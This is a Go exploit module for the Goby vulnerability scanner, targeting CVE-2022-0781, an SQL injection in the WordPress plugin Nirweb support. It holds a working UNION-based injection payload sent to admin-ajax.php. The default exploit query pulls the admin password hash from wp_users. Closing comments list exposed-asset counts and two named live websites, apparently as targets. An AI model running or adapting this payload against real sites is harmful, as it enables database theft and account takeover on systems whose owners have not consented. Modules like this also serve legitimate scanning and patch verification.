package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin Nirweb support admin-ajax.php id_form SQL Injection Vulnerability (CVE-2022-0781)",
    "Description": "<p>WordPress plugin Nirweb support is a plugin with sales, support, management and other functions.</p><p>There is a SQL injection vulnerability in versions before WordPress plugin Nirweb support 2.8.2. The vulnerability stems from the failure to clean and escape parameters. Attackers exploiting this vulnerability can lead to SQL injection attacks.</p>",
    "Product": "wordpress-plugin-nirweb-support",
    "Homepage": "https://wordpress.org/plugins/nirweb-support/",
    "DisclosureDate": "2022-02-28",
    "Author": "h1ei1",
    "FofaQuery": "body=\"wp-content/plugins/nirweb-support\"",
    "GobyQuery": "body=\"wp-content/plugins/nirweb-support\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in versions before WordPress plugin Nirweb support 2.8.2. The vulnerability stems from the failure to clean and escape parameters. Attackers exploiting this vulnerability can lead to SQL injection attacks.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wpscan.com/plugin/nirweb-support.\">https://wpscan.com/plugin/nirweb-support.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/1a8f9c7b-a422-4f45-a516-c3c14eb05161"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "md5(123),(SELECT user_pass FROM wp_users WHERE ID = 1)",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-0781"
    ],
    "CNNVD": [
        "CNNVD-202205-3949"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress Nirweb support 插件 admin-ajax.php 文件 id_form 参数SQL注入漏洞（CVE-2022-0781）",
            "Product": "wordpress-plugin-nirweb-support",
            "Description": "<p>WordPress plugin Nirweb support 是一款拥有销售、支持、管理等功能的插件。<br></p><p>WordPress plugin Nirweb support 2.8.2 之前版本存在SQL注入漏洞，该漏洞源于未对参数进行清理和转义，攻击者利用该漏洞可导致 SQL 注入攻击。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wpscan.com/plugin/nirweb-support\">https://wpscan.com/plugin/nirweb-support</a>。<br></p>",
            "Impact": "<p>WordPress plugin Nirweb support 2.8.2 之前版本存在SQL注入漏洞，该漏洞源于未对参数进行清理和转义，攻击者利用该漏洞可导致 SQL 注入攻击。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress plugin Nirweb support admin-ajax.php id_form SQL Injection Vulnerability (CVE-2022-0781)",
            "Product": "wordpress-plugin-nirweb-support",
            "Description": "<p>WordPress plugin Nirweb support is a plugin with sales, support, management and other functions.<br></p><p>There is a SQL injection vulnerability in versions before WordPress plugin Nirweb support 2.8.2. The vulnerability stems from the failure to clean and escape parameters. Attackers exploiting this vulnerability can lead to SQL injection attacks.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wpscan.com/plugin/nirweb-support.\">https://wpscan.com/plugin/nirweb-support.</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in versions before WordPress plugin Nirweb support 2.8.2. The vulnerability stems from the failure to clean and escape parameters. Attackers exploiting this vulnerability can lead to SQL injection attacks.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10800"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/wp-admin/admin-ajax.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5(123),NULL,NULL,NULL,NULL,NULL-- -"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "202cb962ac59075b964b07152d234b70")

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sql"].(string)
			uri := "/wp-admin/admin-ajax.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,%s,NULL,NULL,NULL,NULL,NULL-- -", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = resp.RawBody
				expResult.Success = true
			}

			return expResult
		},
	))
}

//hunter资产856,zoomeye资产1230
//https://www.cmsnovin.com
//https://yazdani.academy